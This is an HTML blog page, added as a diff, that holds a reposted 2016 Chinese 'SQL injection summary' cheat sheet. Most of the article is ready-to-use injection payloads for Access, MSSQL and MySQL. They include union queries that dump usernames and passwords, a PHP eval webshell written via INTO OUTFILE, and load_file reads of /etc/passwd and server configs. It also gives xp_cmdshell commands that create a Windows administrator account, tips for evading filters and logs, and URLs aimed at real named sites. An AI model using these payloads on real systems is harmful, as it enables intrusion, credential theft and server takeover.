@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <link rel="dns-prefetch" href="http://iyushan.github.io">
+  <title>sql注入总结 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="#sql注入总结
+##第一步 简介
+常用数据库
+
+ASP+access
+ASP+mssql
+PHP+mysql
+
+比如这个链接
+
+http://www.19cn.com/showdetail.asp?id=49
+
+在后面加单引号&amp;#39; 后会服务器会返回下面错误
+
+  Microsoft JET Database Engine 错误 ‘80040e14’   字符串的语法错误 在查询表达式 ‘I">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入总结">
+<meta property="og:url" content="http://iyushan.github.io/2016/09/30/sql注入总结/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="#sql注入总结
+##第一步 简介
+常用数据库
+
+ASP+access
+ASP+mssql
+PHP+mysql
+
+比如这个链接
+
+http://www.19cn.com/showdetail.asp?id=49
+
+在后面加单引号&amp;#39; 后会服务器会返回下面错误
+
+  Microsoft JET Database Engine 错误 ‘80040e14’   字符串的语法错误 在查询表达式 ‘I">
+<meta property="og:updated_time" content="2016-09-30T15:45:56.571Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入总结">
+<meta name="twitter:description" content="#sql注入总结
+##第一步 简介
+常用数据库
+
+ASP+access
+ASP+mssql
+PHP+mysql
+
+比如这个链接
+
+http://www.19cn.com/showdetail.asp?id=49
+
+在后面加单引号&amp;#39; 后会服务器会返回下面错误
+
+  Microsoft JET Database Engine 错误 ‘80040e14’   字符串的语法错误 在查询表达式 ‘I">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/assets/img/favicon.ico">
+  
+  <link rel="stylesheet" href="/main.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+      <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img src="https://cl.ly/472m3a0y1N0L/2.JPG" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">yu_shan</a></h1>
+		</hgroup>
+
+		
+		<p class="header-subtitle">业精于勤荒于嬉 行成于思毁于随</p>
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+				<li><a href="http://www.iyushan.cn/yu_shan.html">More</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+	        
+    		
+    			
+    			<a class="js-smart-menu" data-idx="0" href="javascript:void(0)">所有文章</a>
+    			
+    			
+            
+    			
+    			<a class="js-smart-menu" data-idx="1" href="javascript:void(0)">关于我</a>
+    			
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"><i class="icon-list"></i></div>
+  		<h1 class="header-author js-mobile-header hide">yu_shan</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				
+					<img src="https://cl.ly/472m3a0y1N0L/2.JPG" class="js-avatar">
+				
+			</div>
+			<hgroup>
+			  <h1 class="header-author">yu_shan</h1>
+			</hgroup>
+			
+			<p class="header-subtitle">业精于勤荒于嬉 行成于思毁于随</p>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="http://www.iyushan.cn/yu_shan.html">More</a></li>
+		        
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap">
+        <article id="post-sql注入总结" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql注入总结
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#<strong>sql注入总结</strong><br><br><br></p>
+<p>##第一步 简介</p>
+<p>常用数据库</p>
+<ul>
+<li>ASP+access</li>
+<li>ASP+mssql</li>
+<li>PHP+mysql</li>
+</ul>
+<p>比如这个链接</p>
+<blockquote>
+<p><a href="http://www.19cn.com/showdetail.asp?id=49" target="_blank" rel="external">http://www.19cn.com/showdetail.asp?id=49</a></p>
+</blockquote>
+<p>在后面加单引号<code>&#39;</code> 后会服务器会返回下面错误</p>
+<blockquote>
+<p>  Microsoft JET Database Engine 错误 ‘80040e14’<br>   字符串的语法错误 在查询表达式 ‘ID=49’’ 中。<br> /showdetail.asp，行8</p>
+</blockquote>
+<p>通过以上可以看出</p>
+<ol>
+<li>网站使用的是Access数据库，通过JET引擎连接数据库，而不是通过ODBC。</li>
+<li>程序没有判断客户端提交的数据是否符合程序要求。</li>
+<li>该SQL语句所查询的表中有一名为ID的字段。<br>##第二步 判断能否SQL注入</li>
+</ol>
+<p>注入分为3种类型</p>
+<ul>
+<li>数字型</li>
+</ul>
+<p><code>ID=49</code> 这类注入的参数是数字型，SQL语句原貌大致如下<br><code>Select * from 表名 where 字段=49</code>注入的参数为<code>ID=49 And [查询条件]</code>，即是生成语句：<code>Select * from 表名 where 字段=49 And [查询条件]</code></p>
+<ul>
+<li>字符型</li>
+</ul>
+<p><code>Class=连续剧</code> 这类注入的参数是字符型，SQL语句原貌大致概如下：<br><code>Select * from 表名 where 字段=’连续剧’</code><br>注入的参数为<br><code>Class=连续剧’ and [查询条件] and ‘’=’</code> ，即是生成语句：<br><code>Select * from 表名 where 字段=’连续剧’ and [查询条件] and ‘’=’’</code></p>
+<ul>
+<li>搜索型</li>
+</ul>
+<p><code>keyword=关键字</code>，SQL语句原貌大致如下：<br><code>select * from 表名 where 字段like ’%关键字%’</code><br>注入的参数为<code>keyword=’ and [查询条件] and ‘%25’=’</code>， 即是生成语句：<code>Select * from 表名 where字段like ’%’ and [查询条件] and ‘%’=’%’</code>除了第一步的方法过于简单还有更多的方法去判断该点能否SQL注入还有很多其他的方法此章节将会动态更新<br>举例</p>
+<pre><code>数字型
+1.http://www.19cn.com/showdetail.asp?id=49  
+2.http://www.19cn.com/showdetail.asp?id=49 and 1=1  
+3.http://www.19cn.com/showdetail.asp?id=49 and 1=2
+字符型
+2.http://www.19cn.com/showdetail.asp?Class=连续剧’ and ‘’=’
+3.http://www.19cn.com/showdetail.asp?Class=连续剧’ and ‘2’=’
+搜索型
+2.keyword=’ and ‘%25’=’
+3.keyword=’ and ‘%24’=’
+</code></pre><p>可以注入:</p>
+<pre><code>a. 正常显示（这是必然的，不然就是程序有错误了）
+b. 正常显示，内容基本与①相同
+c. 提示BOF或EOF（程序没做任何判断时）、或提示找不到记录（判断了rs.eof时）、或显示内容为空（程序加了on error resume next）
+</code></pre><p>不可以注入</p>
+<pre><code>a. 同样正常显示，②和③一般都会有程序定义的错误提示，或提示类型转换时出错。
+</code></pre><p>##第三步 判断数据库类型<br>从SQLserver的系统变量入手</p>
+<pre><code>数字型
+http://www.19cn.com/showdetail.asp?id=49 and user&gt;0
+字符型
+http://www.19cn.com/showdetail.asp?Class=文章’ and user&gt;0 and ‘’=’
+搜索型
+keywords=’ and user&gt;0 and ‘%25’=’
+</code></pre><p>user是SQLServer的一个内置变量，它的值是当前连接的用户名，类型为nvarchar。一个nvarchar的值跟int的数0比较，系统会先试图将nvarchar的值转成int型，转过程中肯定会出错，SQLServer的出错提示是：将nvarchar值 ”abc” 转换数据类型为 int 的列时发生语法错误，abc是变量user的值就拿到了数据库的用户名。</p>
+<p>注意：如果是sa登录，提示是将”dbo”转换成int的列发生错误，而不是”sa”。</p>
+<p>如果IIS关掉系统报错从Access和SQLServer和区别入手</p>
+<p>Access是在系统表msysobjects中，但在Web环境下读该表会提示“没有权限”。<br>SQLServer是在表sysobjects中，在Web环境下可正常读取。</p>
+<p>数字型</p>
+<p><code>http://www.19cn.com/showdetail.asp?id=49 and (select count(*) from sysobjects)&gt;0</code><br><code>http://www.19cn.com/showdetail.asp?id=49 and (select count(*) from msysobjects)&gt;0</code></p>
+<p>SQLServer第一个网址的页面与原页面是大致相同的；而第二个网址，由于找不到表msysobjects，会提示出错，就算程序有容错处理，页面也与原页面完全不同。<br>Access第一个网址的页面与原页面完全不同；第二个网址，则视乎数据库设置是否允许读该系统表，一般来说是不允许的，所以与原网址也是完全不同。大多数情况下，用第一个网址就可以得知系统所用的数据库类型，第二个网址只作为开启IIS错误提示时的验证。</p>
+<p>MYsql待补充</p>
+<p>##第四步 猜解表名，字段，值<br><strong>猜解表名和字段名</strong></p>
+<p>数字型<br><code>ID=49 And (Select Count(*) from Admin)&gt;=0</code></p>
+<p>字符型<br><code>Class=连续剧’ and (Select Count(*) from Admin)&gt;=0 and ‘’=’</code></p>
+<p>搜索型<br><code>keyword=’ and (Select Count(*) from Admin)&gt;=0 and ‘%25’=’</code></p>
+<p>如果页面就与<code>ID=49</code>的相同，说明附加条件成立，即表Admin存在，反之，即不存在（请牢记这种方法）。如此循环，直至猜到表名为止。表名猜出来后，将<code>Count(*)</code>替换成<code>Count(字段名)</code>，用同样的原理猜解字段名。</p>
+<p><strong>猜解字段的长度</strong></p>
+<p>Ascii逐字解码法</p>
+<p>我们举个例子，已知表Admin中存在username字段，首先，我们取第一条记录，测试长度</p>
+<p>数字型<br><code>.asp?id=49 and (select top 1 len(username) from Admin)&gt;0</code></p>
+<p>先说明原理：如果top 1的username长度大于0，则条件成立；接着就是&gt;1、&gt;2、&gt;3这样测试下去，一直到条件不成立为止，比如&gt;7成立，&gt;8不成立，就是len(username)=8<br>当然没人会笨得从0,1,2,3一个个测试，怎么样才比较快就看各自发挥了。</p>
+<p>在得到username的长度后，用mid(username,N,1)截取第N位字符，再asc(mid(username,N,1))得到ASCII码，比如：</p>
+<p>数字型</p>
+<p><code>id=49 and (select top 1 asc(mid(username,1,1)) from Admin)&gt;0</code></p>
+<p><code>asc(mid(s,i,1))</code>,先看mid，s表示一串字符，假设<code>s=digcvx</code>,那么i就表示从s这串字符中i开始取，1就表示取一个，所以<code>mid（s,i,1）=i</code>，以此类推，<code>mid(a,v,3)</code>，<code>a=zxcgvertg</code>，那么<code>mid（a,v,3）=ver</code>。然后asc表示求字符串表达式的第一个字符的ASCII 编码，也就是求i的ASCII码</p>
+<pre><code>Access：asc(字符) SQLServer：unicode(字符)
+作用：返回某字符的ASCII码
+Access：chr(数字) SQLServer：nchar(数字)
+作用：与asc相反，根据ASCII码返回字符
+Access：mid(字符串,N,L) SQLServer：substring(字符串,N,L)
+作用：返回字符串从N个字符起长度为L的子字符串，即N到N+L之间的字符串
+Access：abc(数字) SQLServer：abc (数字)
+作用：返回数字的绝对值（在猜解汉字的时候会用到）
+Access：A between B And C SQLServer：A between B And C
+作用：判断A是否界于B与C之间
+</code></pre><p>中文处理方法</p>
+<p>在注入中碰到中文字符是常有的事，有些人一碰到中文字符就想打退堂鼓了。其实只要对中文的编码有所了解，“中文恐惧症”很快可以克服。</p>
+<p>先说一点常识：</p>
+<p>Access中，中文的ASCII码可能会出现负数，取出该负数后用<code>abs()</code>取绝对值，汉字字符不变。<br>SQLServer中，中文的ASCII为正数，但由于是UNICODE的双位编码，不能用函数<code>ascii()</code>取得ASCII码，必须用函数<code>unicode()</code>返回unicode值，再用nchar函数取得对应的中文字符</p>
+<p><strong>mysql专用</strong></p>
+<p>mysql注入科普</p>
+<blockquote>
+<p><a href="http://drops.wooyun.org/tips/123" target="_blank" rel="external">http://drops.wooyun.org/tips/123</a></p>
+</blockquote>
+<p>mysql注入流程</p>
+<blockquote>
+<p><a href="http://www.rising.com.cn/newsletter/news/2012-05-24/11580.html" target="_blank" rel="external">http://www.rising.com.cn/newsletter/news/2012-05-24/11580.html</a></p>
+</blockquote>
+<p>mysql注入常用变量名</p>
+<blockquote>
+<p><a href="http://database.51cto.com/art/201011/235407.htm" target="_blank" rel="external">http://database.51cto.com/art/201011/235407.htm</a></p>
+</blockquote>
+<p>暴字段长度:   <code>Order by num/*</code></p>
+<p>匹配字段:<code>and 1=1 union select 1,2,3,4,5…….n/*</code></p>
+<p>暴字段位置:<code>and 1=2 union select 1,2,3,4,5…..n/*</code></p>
+<p>利用内置函数暴数据库信息:<code>version()</code> <code>database()</code> <code>user()</code></p>
+<p>不用猜解可用字段暴数据库信息(有些网站不适用):</p>
+<pre><code>and 1=2 union all select version() /*
+and 1=2 union all select database() /*
+and 1=2 union all select user() /*
+</code></pre><p>操作系统信息：<code>and 1=2 union all select @@global.version_compile_os from mysql.user /*</code></p>
+<p>数据库权限：<code>and ord(mid(user(),1,1))=114 /* 返回正常说明为root</code></p>
+<p>暴库 (mysql&gt;5.0):Mysql 5 以上有内置库 <code>information_schema</code>，存储着mysql的所有数据库和表结构信息<br><code>and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1</code></p>
+<p>猜表 数据库（十六进制）, limit 0（0为第一个开始记录,显示1条记录）<code>and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库 limit 0,1 —</code></p>
+<p>猜字段 表名（十六进制<code>and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名 limit 0,1</code></p>
+<p>暴密码<code>and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1</code></p>
+<p>高级用法（一个可用字段显示两个数据内容）：<br><code>Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1</code></p>
+<p>直接写马(Root权限)</p>
+<p>条件：</p>
+<ol>
+<li>知道站点物理路径</li>
+<li>有足够大的权限（可以用select …. from mysql.user测试）</li>
+<li>magic_quotes_gpc()=OFF</li>
+</ol>
+<p><code>select   ‘&lt;?php eval($_POST[cmd])?&gt;&#39;   into outfile ‘物理路径&#39;
+and 1=2 union all select 一句话HEX值 into outfile &#39;路径&#39;</code></p>
+<p><code>load_file()</code> 常用路径：</p>
+<pre><code>`replace(load_file(0×2F6574632F706173737764),0×3c,0×20)`
+`replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))`
+</code></pre><p>上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 “&lt;” 替换成”空格” 返回的是网页.而无法查看到代码.</p>
+<pre><code>* load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录
+* /etc tpd/conf tpd.conf或/usr/local/apche/conf tpd.conf 查看linux APACHE虚拟主机配置文件
+* c:\Program Files\Apache Group\Apache\conf \httpd.conf 或C:\apache\conf \httpd.conf 查看WINDOWS系统apache文件
+* c:/Resin-3.0.14/conf/resin.conf   查看jsp开发的网站 resin文件配置信息.
+* c:/Resin/conf/resin.conf      /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
+* d:\APACHE\Apache2\conf\httpd.conf
+* C:\Program Files\mysql\my.ini
+* ../themes/darkblue_orange/layout.inc.php phpmyadmin 爆路径
+* c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置文件
+* /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
+* /usr/local/resin-pro-3.0.22/conf/resin.conf 同上
+* /usr/local/app/apache2/conf/extra tpd-vhosts.conf APASHE虚拟主机查看
+* /etc/sysconfig/iptables 本看防火墙策略
+* usr/local/app/php5 b/php.ini PHP 的相当设置
+* /etc/my.cnf MYSQL的配置文件
+* /etc/redhat-release   红帽子的系统版本
+* C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
+* /etc/sysconfig/network-scripts/ifcfg-eth0 查看IP.
+* /usr/local/app/php5 b/php.ini //PHP相关设置
+* /usr/local/app/apache2/conf/extra tpd-vhosts.conf //虚拟网站设置
+* C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini
+* c:\windows\my.ini
+* c:\boot.ini
+</code></pre><p>网站常用配置文件 config.inc.php、config.php。</p>
+<p><code>load_file（）</code>时要用<code>replace（load_file(HEX)，char(60),char(32)）</code></p>
+<p>注：</p>
+<p>Char(60)表示 &lt;</p>
+<p>Char(32)表示 空格</p>
+<p><strong>手工注射时出现的问题：</strong></p>
+<p>当注射后页面显示：</p>
+<blockquote>
+<p>Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation ‘UNION’</p>
+</blockquote>
+<p>如：</p>
+<blockquote>
+<p><a href="http://www.mse.tsinghua.edu.cn/mse/research/instrument.php?ID=13%20and%201=2%&gt;20union%20select%201,load_file(0x433A5C626F6F742E696E69),3,4,user()%20" target="_blank" rel="external">http://www.mse.tsinghua.edu.cn/mse/research/instrument.php?ID=13%20and%201=2%&gt;20union%20select%201,load_file(0x433A5C626F6F742E696E69),3,4,user()%20</a></p>
+</blockquote>
+<p>这是由于前后编码不一致造成的</p>
+<p>解决方法：在参数前加上 unhex(hex(参数))就可以了。上面的URL就可以改为：</p>
+<blockquote>
+<p><a href="http://www.mse.tsinghua.edu.cn/mse/research/instrument.php?ID=13%20and%201=2%20union%20select%201,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))%20" target="_blank" rel="external">http://www.mse.tsinghua.edu.cn/mse/research/instrument.php?ID=13%20and%201=2%20union%20select%201,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))%20</a></p>
+</blockquote>
+<p>然后可以继续注射了。</p>
+<p>##经验小结<br>深入了解SQL注入绕过waf和过滤机制</p>
+<blockquote>
+<p><a href="http://drops.wooyun.org/tips/968" target="_blank" rel="external">http://drops.wooyun.org/tips/968</a></p>
+</blockquote>
+<p>绕过程序限制继续注入</p>
+<p>当 <code>&#39;</code> 被过滤的情况下可以进行改造,可以用ASCII码代替;<br><br>where xtype=’U’，用where xtype=char(85)代替；<br><br>where name=’用户’可以用where name=nchar(29992)+nchar(25143)代替。<br></p>
+<p><strong>经验小结:</strong></p>
+<ol>
+<li>有些人会过滤Select、Update、Delete这些关键字，但偏偏忘记区分大小写，所以大家可以用selecT这样尝试一下。</li>
+<li>在猜不到字段名时，不妨看看网站上的登录表单，一般为了方便起见，字段名都与表单的输入框取相同的名字。</li>
+<li>特别注意：地址栏的+号传入程序后解释为空格，%2B解释为+号，%25解释为%号，具体可以参考URLEncode的相关介绍。</li>
+<li>用Get方法注入时，IIS会记录你所有的提交字符串，对Post方法做则不记录，所以能用Post的网址尽量不用Get。</li>
+<li>猜解Access时只能用Ascii逐字解码法，SQLServer也可以用这种方法，只需要两者之间的区别即可，但是如果能用SQLServer的报错信息把值暴露出来，那效率和准确率会有极大的提高。</li>
+</ol>
+<p><strong>实战案列大全<br></strong><br>利用系统表注入SQLServer数据库</p>
+<blockquote>
+<p><a href="http://Site/url.asp?id=1;exec" target="_blank" rel="external">http://Site/url.asp?id=1;exec</a> master..xp_cmdshell “net user name password /add”–</p>
+</blockquote>
+<p>分号<code>;</code>在SQLServer中表示隔开前后两句语句，<code>--</code>表示后面的语句为注释，所以，这句语句在SQLServer中将被分成两句执行，先是Select出ID=1的记录，然后执行存储过程xp_cmdshell，这个存储过程用于调用系统命令，于是，用net命令新建了用户名为name、密码为password的windows的帐号，接着：<br></p>
+<blockquote>
+<p><a href="http://Site/url.asp?id=1;exec" target="_blank" rel="external">http://Site/url.asp?id=1;exec</a> master..xp_cmdshell “net localgroup name administrators /add”–</p>
+</blockquote>
+<p>将新建的帐号name加入管理员组，不用两分钟，你已经拿到了系统最高权限！当然，这种方法只适用于用sa连接数据库的情况，否则，是没有权限调用xp_cmdshell的。</p>
+<blockquote>
+<p><a href="http://Site/url.asp?id=1" target="_blank" rel="external">http://Site/url.asp?id=1</a> ;;and db_name()&gt;0</p>
+</blockquote>
+<p>前面有个类似的例子<code>and user&gt;0</code>，作用是获取连接用户名，<code>db_name()</code>是另一个系统变量，返回的是连接的数据库名。</p>
+<blockquote>
+<p><a href="http://Site/url.asp?id=1;backup" target="_blank" rel="external">http://Site/url.asp?id=1;backup</a> database 数据库名 to disk=’c:\inetpub\wwwroot\1.db’;–</p>
+</blockquote>
+<p>这是相当狠的一招， 拿到的数据库名，加上某些IIS出错暴露出的绝对路径，将数据库备份到Web目录下面，再用HTTP把整个数据库就完完整整的下载回来，所有的管理员及用户密码都一览无遗！<br>在不知道绝对路径的时候，还可以备份到网络地址的方法（如\202.96.xx.xx\Share\1.db），但成功率不高。</p>
+<blockquote>
+<p><a href="http://Site/url.asp?id=1" target="_blank" rel="external">http://Site/url.asp?id=1</a> ;;and (Select Top 1 name from sysobjects where xtype=’U’ and status&gt;0)&gt;0</p>
+</blockquote>
+<p>前面说过，sysobjects是SQLServer的系统表，存储着所有的表名、视图、约束及其它对象，<code>xtype=’U’ and status&gt;0</code>，表示用户建立的表名，上面的语句将第一个表名取出，与0比较大小，让报错信息把表名暴露出来。第二、第三个表名怎么获取？还是留给我们聪明的读者思考吧。</p>
+<blockquote>
+<p><a href="http://Site/url.asp?id=1" target="_blank" rel="external">http://Site/url.asp?id=1</a> ;;and (Select Top 1 col_name(object_id(‘表名’),1) from sysobjects)&gt;0</p>
+</blockquote>
+<p>拿到表名后，用<code>object_id(‘表名’)</code>获取表名对应的内部ID，<code>col_name(表名ID,1)</code>代表该表的第1个字段名，将1换成2,3,4…就可以逐个获取所猜解表里面的字段名。</p>
+<p>以上6点是我研究SQLServer注入半年多以来的心血结晶，可以看出，对SQLServer的了解程度，直接影响着成功率及猜解速度。在我研究SQLServer注入之后，我在开发方面的水平也得到很大的提高，呵呵，也许安全与开发本来就是相辅相成的吧。</p>
+<p>文／姜喃人（简书作者）<br>原文链接：<a href="http://www.jianshu.com/p/b562a0d03cbb" target="_blank" rel="external">http://www.jianshu.com/p/b562a0d03cbb</a><br>著作权归作者所有，转载请联系作者获得授权，并标注“简书作者”。</p>
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/09/30/sql注入总结/" class="archive-article-date">
+  	<time datetime="2016-09-30T11:39:45.317Z" itemprop="datePublished"><i class="icon-clock"></i>2016-09-30</time>
+</a>
+      
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2016/10/10/movie/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          超体_电影观后感
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/09/29/dvwa初级sql注入试炼/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">dvwa初级sql注入试炼</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">Share to: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+	    <a class="jiathis_button_twitter"></a>
+	    <a class="jiathis_button_plus"></a> 
+	    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="//v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="sql注入总结" data-title="sql注入总结" data-url="http://iyushan.github.io/2016/09/30/sql注入总结/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"litten-hexo"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2016 John Doe
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    <script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: true,
+		root: "/",
+		innerArchive: true
+	}
+</script>
+
+<script src="/./main.js"></script>
+
+
+    
+<div class="tools-col">
+  <ul class="btn-wrap">
+    
+      <li class="chose" data-hook="tools-section-all"><span class="text">全部</span><i class="icon-book"></i></li>
+    
+    
+    
+    
+      <li data-hook="tools-section-me"><span class="text">我</span><i class="icon-smile"></i></li>
+    
+  </ul>
+  <div class="tools-wrap">
+    
+    	<section class="tools-section tools-section-all chose">
+    	</section>
+    
+
+    
+
+    
+
+    
+    	<section class="tools-section tools-section-me">
+  	  	
+  	  		<div class="aboutme-wrap" id="js-aboutme">Mr.Liu&lt;br&gt;&lt;br&gt;记录点滴，热爱生命&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</div>
+  	  	
+    	</section>
+    
+  </div>
+  
+</div>
+    <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+  </div>
+</body>
+</html>
